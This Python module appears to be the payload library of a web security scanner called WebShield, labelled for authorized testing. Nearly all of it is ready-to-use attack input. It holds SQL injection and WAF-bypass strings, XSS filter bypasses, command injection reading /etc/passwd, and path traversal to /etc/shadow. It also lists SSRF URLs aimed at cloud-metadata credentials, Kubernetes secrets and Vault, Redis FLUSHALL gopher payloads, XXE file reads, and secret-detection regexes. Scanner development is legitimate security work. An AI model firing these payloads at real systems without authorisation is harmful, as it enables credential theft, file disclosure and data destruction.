"""
Payload library for various injection attack types.
For authorized security research and penetration testing only.
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from typing import Dict, List

# ---------------------------------------------------------------------------
# SQL Injection Payloads
# ---------------------------------------------------------------------------

SQLI_ERROR_BASED: List[str] = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "') OR ('1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
    "1 AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,0x71,0x71,(SELECT (ELT(1=1,1))),0x71))s), 8446744073709551610, 8446744073709551610)))--",
    "1 OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
]

SQLI_UNION_BASED: List[str] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "1 UNION SELECT 1,2,3--",
    "1' UNION SELECT 1,database(),3--",
    "1' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "1 UNION SELECT username,password FROM users--",
    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
    "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
]

SQLI_BOOLEAN_BASED: List[str] = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SUBSTRING(version(),1,1)='5'--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'--",
    "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
]

SQLI_TIME_BASED: List[str] = [
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
    "' OR SLEEP(3)--",
    "1 OR SLEEP(5)",
    "' AND SLEEP(5)--",
    "'; SELECT SLEEP(5)--",
    "1) OR SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1 AND (SELECT 1 FROM (SELECT SLEEP(5)) t)--",
    "'; exec master..xp_cmdshell('ping -n 5 127.0.0.1')--",
    "1;SELECT pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
]

SQLI_ALL: List[str] = list(dict.fromkeys(
    SQLI_ERROR_BASED + SQLI_UNION_BASED + SQLI_BOOLEAN_BASED + SQLI_TIME_BASED
))

# ---------------------------------------------------------------------------
# XSS Payloads
# ---------------------------------------------------------------------------

XSS_BASIC: List[str] = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<a href=javascript:alert(1)>click</a>",
]

# Fix 5.1: filter bypass payloads — no duplicates with XSS_BASIC
XSS_FILTER_BYPASS: List[str] = [
    # Case / whitespace variants (not in BASIC)
    "<ScRiPt>alert(1)</sCrIpT>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<script >alert(1)</script >",
    "<svg\tonload=alert(1)>",
    "<svg\nonload=alert(1)>",
    "<svg\ronload=alert(1)>",
    "<IMG SRC=x ONERROR=alert(1)>",
    # Encoding variants
    "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
    r'<img src=x onerror=eval("\x61\x6c\x65\x72\x74\x28\x31\x29")>',
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>al/**/ert(1)</script>",
    # Context breaks
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    # Tag variants
    "<%2fscript>",
    "<script/src=data:,alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext></p><script>alert(1)</script>",
    "<table><td background=javascript:alert(1)>",
    "<link rel=import href=javascript:alert(1)>",
    "<script>/*</script><script>*/alert(1)</script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<<script>alert(1);//<</script>",
    # Event handlers (not in BASIC)
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<select autofocus onfocus=alert(1)>',
    '<textarea autofocus onfocus=alert(1)>',
    '<keygen autofocus onfocus=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<marquee onstart=alert(1)>',
    # Object / iframe / embed
    '<object data=javascript:alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<iframe srcdoc="<script>alert(1)</script>">',
    # Attribute/context breaks
    "';alert(1)//",
    "\";alert(1)//",
    "</style><script>alert(1)</script>",
    # Bypass specific
    '<svg onload=alert`${document.domain}`>',
]

XSS_DOM: List[str] = [
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "?redirect=javascript:alert(1)",
    "?url=javascript:alert(1)",
    "?next=javascript:alert(1)",
    "?callback=alert(1)",
    "?jsonp=alert(1)",
]

# Fix 5.1: XSS_ADVANCED — only payloads NOT already in BASIC or FILTER_BYPASS
XSS_ADVANCED: List[str] = [
    # Exfil payloads (for authorized testing)
    '<svg onload=alert(document.cookie)>',
    '<svg onload=alert(JSON.stringify(localStorage))>',
    # SVG advanced
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    '<math><mtext></mtext><mglyph><svg><mtext></mtext></svg></mglyph></math><img src=x onerror=alert(1)>',
    # DOM-based
    '#"><img src=x onerror=alert(1)>',
    '<iframe onload="this.contentWindow.postMessage(\'<img src=x onerror=alert(1)>\',\'*\')">',
    # Context-break combos
    ']]><img src=x onerror=alert(1)><![CDATA[',
    '--><img src=x onerror=alert(1)><!--',
    # Misc technique
    "x onmouseover=alert(1) y=",
    '"}]};alert(1);//',
]

# Canonical merged lists — built without duplication
XSS_ALL: List[str] = list(dict.fromkeys(XSS_BASIC + XSS_FILTER_BYPASS + XSS_DOM))
XSS_ALL_ADVANCED: List[str] = list(dict.fromkeys(XSS_ALL + XSS_ADVANCED))
# ---------------------------------------------------------------------------

CMDI_UNIX: List[str] = [
    "; id",
    "& id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "& whoami",
    "| whoami",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "& ls -la",
    "|| id",
    "&& id",
    "\n id",
    "; ping -c 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "1; sleep 5",
    "1 | sleep 5",
]

CMDI_WINDOWS: List[str] = [
    "& whoami",
    "| whoami",
    "; whoami",
    "& dir",
    "| dir",
    "& ipconfig",
    "& ping -n 3 127.0.0.1",
    "| type C:\\Windows\\win.ini",
    "& type C:\\Windows\\win.ini",
    "1& whoami",
    "1| whoami",
]

CMDI_ALL: List[str] = list(dict.fromkeys(CMDI_UNIX + CMDI_WINDOWS))

# ---------------------------------------------------------------------------
# Path Traversal / LFI Payloads
# ---------------------------------------------------------------------------

PATH_TRAVERSAL: List[str] = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "C:\\windows\\win.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\boot.ini",
    "../../../../boot.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "file:///etc/passwd",
]

# ---------------------------------------------------------------------------
# SSRF Payloads
# ---------------------------------------------------------------------------

SSRF_PAYLOADS: List[str] = [
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:22",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "http://localhost",
    "http://localhost:80",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0177.0.0.1",
    "http://2130706433",          # decimal 127.0.0.1
    "http://0x7f000001",          # hex 127.0.0.1
    "http://169.254.169.254",     # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200",     # Alibaba Cloud metadata
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "dict://127.0.0.1:11211/",
    "gopher://127.0.0.1:11211/",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "sftp://127.0.0.1",
    "ldap://127.0.0.1",
]

# ---------------------------------------------------------------------------
# XXE Payloads
# ---------------------------------------------------------------------------

XXE_PAYLOADS: List[str] = [
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
<root><data>&xxe;</data></root>""",

    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<root><data>&xxe;</data></root>""",

    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]>
<foo/>""",

    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>""",

    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>
<foo>&xxe;</foo>""",
]

# ---------------------------------------------------------------------------
# Open Redirect Payloads
# ---------------------------------------------------------------------------

OPEN_REDIRECT: List[str] = [
    "//evil.com",
    "//evil.com/",
    "https://evil.com",
    "http://evil.com",
    "//evil.com/%2F..",
    "/\\evil.com",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
    "https://evil.com?http://legitimate.com",
    "//legitimate.com.evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "%2F%2Fevil.com",
    "%68%74%74%70%73%3A%2F%2Fevil.com",
    "//evil%E3%80%82com",
    "https://evil。com",
    "\r\nhttps://evil.com",
    " https://evil.com",
    "\thttps://evil.com",
]

# ---------------------------------------------------------------------------
# JWT Attack Payloads
# ---------------------------------------------------------------------------

JWT_WEAK_SECRETS: List[str] = [
    "secret",
    "password",
    "123456",
    "admin",
    "test",
    "jwt",
    "key",
    "private",
    "changeme",
    "",
    "your-256-bit-secret",
    "your-512-bit-secret",
    "supersecret",
    "mysecret",
    "qwerty",
    "letmein",
    "abc123",
    "HS256",
    "RS256",
    "none",
]

# Payload to test "alg:none" attack
JWT_NONE_ALG_HEADER = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"

# ---------------------------------------------------------------------------
# Security Header checks
# ---------------------------------------------------------------------------

REQUIRED_SECURITY_HEADERS: Dict[str, str] = {
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "X-Frame-Options": "DENY or SAMEORIGIN",
    "X-Content-Type-Options": "nosniff",
    "Content-Security-Policy": "Required",
    "Referrer-Policy": "no-referrer or strict-origin",
    "Permissions-Policy": "Required",
    "X-XSS-Protection": "1; mode=block (legacy but checked)",
}

INSECURE_RESPONSE_HEADERS: List[str] = [
    "Server",
    "X-Powered-By",
    "X-AspNet-Version",
    "X-AspNetMvc-Version",
    "X-Generator",
]

# ---------------------------------------------------------------------------
# Sensitive Data Patterns (regex strings, compiled in patterns.py)
# ---------------------------------------------------------------------------

SENSITIVE_DATA_PATTERNS: Dict[str, str] = {
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key": r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]",
    "Private Key (RSA)": r"-----BEGIN RSA PRIVATE KEY-----",
    "Private Key (Generic)": r"-----BEGIN PRIVATE KEY-----",
    "GitHub Token": r"ghp_[0-9a-zA-Z]{36}",
    "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
    "JWT Token": r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+",
    "Credit Card (Visa)": r"4[0-9]{12}(?:[0-9]{3})?",
    "Credit Card (Mastercard)": r"(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}",
    "SSN": r"(?!219-09-9999|078-05-1120)(?!666|000|9\d{2})\d{3}-(?!00)\d{2}-(?!0{4})\d{4}",
    "Password in URL": r"(?i)[?&](password|passwd|pwd|pass)=[^&\s]+",
    "Basic Auth in URL": r"https?://[^:]+:[^@]+@",
    "Email Address": r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
    "Internal IP": r"(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}",
    "Stack Trace (PHP)": r"(?i)(Fatal error|Parse error|Warning):.+on line \d+",
    "Stack Trace (Python)": r"Traceback \(most recent call last\)",
    "Stack Trace (Java)": r"at [a-zA-Z_$][a-zA-Z0-9_$]*\.[a-zA-Z_$][a-zA-Z0-9_$]*\(",
    "SQL Error (MySQL)": r"(?i)(you have an error in your sql syntax|mysql_fetch|mysql_num_rows)",
    "SQL Error (MSSQL)": r"(?i)(microsoft ole db provider for sql server|odbc sql server driver)",
    "SQL Error (Oracle)": r"(?i)(ora-\d{5}|oracle error)",
    "SQL Error (PostgreSQL)": r"(?i)(pg::syntaxerror|postgresql.*error)",
    "Directory Listing": r"(?i)(index of|parent directory|directory listing)",
}

# ---------------------------------------------------------------------------
# Advanced SSRF Payloads (from SSRF Tester v2)
# ---------------------------------------------------------------------------

SSRF_CLOUD_METADATA: List[str] = [
    # AWS IMDSv1
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/public-keys/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # AWS Lambda
    "http://169.254.170.2/v2/credentials/",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1.json",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    # Kubernetes
    "https://kubernetes.default.svc/api/v1/",
    "https://kubernetes.default.svc/api/v1/secrets",
    "https://kubernetes.default.svc/api/v1/namespaces",
]


# ---------------------------------------------------------------------------
# SQLi WAF Bypass Payloads — used when standard payloads return 403/406/429
# ---------------------------------------------------------------------------

SQLI_WAF_BYPASS: List[str] = [
    # Comment-based space bypass
    "1'/**/OR/**/1=1--",
    "1'/*!OR*/1=1--",
    "1'%09OR%091=1--",           # tab-encoded space
    "1'+OR+1=1--",               # plus-encoded space
    # Case variation
    "1'%20oR%201=1--",
    "1' Or 1=1--",
    "1' oR '1'='1",
    # Inline comment splitting
    "1'/*x*/UNION/*x*/SELECT/*x*/NULL--",
    "1' UNION%20SELECT%20NULL--",
    "1'%20UNION%20ALL%20SELECT%20NULL--",
    # Double encoding
    "1%2527 OR 1=1--",
    "1%27%20OR%201%3D1--",
    # Hex-encoded string
    "1' OR 0x31=0x31--",
    # Scientific notation
    "1e0 OR 1e0=1e0--",
    # MySQL conditional comment
    "1' /*!50000OR*/ 1=1--",
    # HPP (HTTP Parameter Pollution) variant
    "1&id=2' OR '1'='1",
    # Null byte
    "1'%00 OR 1=1--",
    # Newline injection
    "1'\nOR\n1=1--",
    "1'%0aOR%0a1=1--",
    # Version-specific MySQL comment
    "1' /*!32302OR*/ 1=1--",
]

SSRF_BYPASS_ENCODINGS: List[str] = [
    # IP encoding bypasses
    "http://2130706433",          # 127.0.0.1 decimal
    "http://0177.0.0.1",          # 127 octal
    "http://0x7f000001",          # 127.0.0.1 hex
    "http://0177.0.0x1",          # Mixed octal/hex
    "http://127.000.000.001",     # Padded zeros
    "http://127.1",               # Abbreviated
    "http://127.127.127.127",     # Any 127.x is loopback
    "http://2852039166",          # 169.254.169.254 decimal
    "http://[::ffff:127.0.0.1]",  # IPv4-mapped IPv6
    "http://[::ffff:7f00:0001]",  # IPv4-mapped IPv6 hex
    "http://127%252E0%252E0%252E1",  # URL encoded dots
    "http://127%25252E0%25252E0%25252E1",  # Double encoded
    "http://0000:0000:0000:0000:0000:0000:0000:0001",  # Full IPv6
    "HTTP://LOCALHOST",           # Uppercase scheme
    "http://attacker@127.0.0.1",  # User-info bypass
    "http://expected-host@127.0.0.1",  # Host confusion
    "http://127.0.0.1#.expected.com",  # Fragment bypass
    "http://127.0.0.1?.expected.com",  # Query confusion
    "http://127.0.0.1/expected.com",   # Path confusion
    "http:///127.0.0.1",          # Triple slash
    "http://127.0.0.1%0d%0aHost:%20evil.com",  # CRLF injection
    # DNS-based bypasses
    "http://localtest.me",        # Resolves to 127.0.0.1
    "http://127.0.0.1.nip.io",   # nip.io wildcard
    "http://127.0.0.1.xip.io",   # xip.io wildcard
    "http://127-0-0-1.sslip.io", # sslip.io
    # IPv6 variants
    "http://[0:0:0:0:0:ffff:169.254.169.254]",  # IPv4-in-IPv6
    "http://0251.0376.0251.0376",   # 169.254.169.254 octal
    "http://0xa9fea9fe",            # 169.254.169.254 hex
]

SSRF_PROTOCOL_BYPASSES: List[str] = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/net/tcp",
    "file:///C:/Windows/System32/drivers/etc/hosts",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:6379/FLUSHALL",
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
    "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00",
    "netdoc:///etc/passwd",
    "jar:http://127.0.0.1!/etc/passwd",
    "ldap://127.0.0.1:389/%0astats%0aquit",
]

SSRF_INTERNAL_SERVICES: List[str] = [
    # Infrastructure services
    "http://127.0.0.1:8500/v1/kv/?recurse",      # Consul KV
    "http://127.0.0.1:8500/v1/catalog/nodes",    # Consul nodes
    "http://127.0.0.1:8200/v1/secret/",          # Vault secrets
    "http://127.0.0.1:2379/v2/keys/",            # etcd
    "http://127.0.0.1:2375/containers/json",     # Docker API
    "http://127.0.0.1:2375/info",                # Docker info
    "http://127.0.0.1:2375/version",             # Docker version
    # Databases (HTTP-accessible)
    "http://127.0.0.1:9200/_cat/indices?v",      # Elasticsearch
    "http://127.0.0.1:9200/_all/_search?size=1", # ES dump
    "http://127.0.0.1:9200/_cluster/health",     # ES health
    "http://127.0.0.1:5984/_all_dbs",            # CouchDB
    # Monitoring/Dev tools
    "http://127.0.0.1:3000/api/users",           # Grafana
    "http://127.0.0.1:8080/api/json",            # Jenkins
    "http://127.0.0.1:9090/api/v1/targets",      # Prometheus
    "http://127.0.0.1:5601/api/status",          # Kibana
    "http://127.0.0.1:15672/",                   # RabbitMQ
    # Spring Boot Actuator
    "http://127.0.0.1:8080/actuator/env",
    "http://127.0.0.1:8080/actuator/configprops",
    "http://127.0.0.1:8080/actuator/mappings",
    "http://127.0.0.1:8080/actuator/beans",
    "http://127.0.0.1:8080/actuator/httptrace",
]

SSRF_ALL_ADVANCED: List[str] = list(dict.fromkeys(
    SSRF_PAYLOADS + SSRF_CLOUD_METADATA + SSRF_BYPASS_ENCODINGS +
    SSRF_PROTOCOL_BYPASSES + SSRF_INTERNAL_SERVICES
))

# ---------------------------------------------------------------------------
# Sensitive Data Patterns (extended with patterns from param.txt bookmarklet)
# ---------------------------------------------------------------------------

SENSITIVE_DATA_PATTERNS_EXTENDED: Dict[str, str] = {
    **SENSITIVE_DATA_PATTERNS,
    "GCP OAuth Secret": r"GOCSPX-[A-Za-z0-9_\-]{28}",
    "Stripe Secret Key": r"sk_live_[0-9a-zA-Z]{24,}",
    "Stripe Publishable Key": r"pk_live_[0-9a-zA-Z]{24,}",
    "GitHub Token (PAT/Actions)": r"gh[pours]_[A-Za-z0-9_]{36,}",
    "Bearer Token": r"[Bb]earer\s+([A-Za-z0-9\-._~+\/]{30,})",
    "Slack Token": r"xox[baprs]-[0-9A-Za-z\-]{10,}",
    "Slack Webhook": r"https:\/\/hooks\.slack\.com\/services\/[A-Za-z0-9\/]+",
    "Twilio SID": r"AC[0-9a-fA-F]{32}",
    "SendGrid Key": r"SG\.[A-Za-z0-9\-_]{22,}\.[A-Za-z0-9\-_]{43,}",
    "npm Token": r"npm_[A-Za-z0-9]{36}",
    "MongoDB URI": r"mongodb(?:\+srv)?:\/\/[^\s\"'`<>]{15,}",
    "SQL Connection URI": r"(?:mysql|postgres(?:ql)?|mssql):\/\/[^\s\"'`<>]{10,}",
    "Redis URI": r"redis:\/\/(?:[^@]+@)?[^\s\"'`<>]{8,}",
    "Cloudinary URL": r"cloudinary:\/\/[0-9]+:[A-Za-z0-9\-_]+@[a-z]+",
    "Sentry DSN": r"https:\/\/[0-9a-f]{32}@o[0-9]+\.ingest\.sentry\.io\/[0-9]+",
    "S3 Bucket URL": r"https?:\/\/[a-z0-9\-\.]+\.s3[a-z0-9\-]*\.amazonaws\.com[^\s\"'`]*",
    "Hardcoded Password": r"(?:password|passwd|pwd)\s*[:=]\s*[\"']([^\"'\s]{8,80})[\"']",
    "Secret Key (Generic)": r"(?:secret[_\-]?key|client[_\-]?secret|app[_\-]?secret)\s*[:=]\s*[\"']([A-Za-z0-9\-_\.\/+]{16,100})[\"']",
}
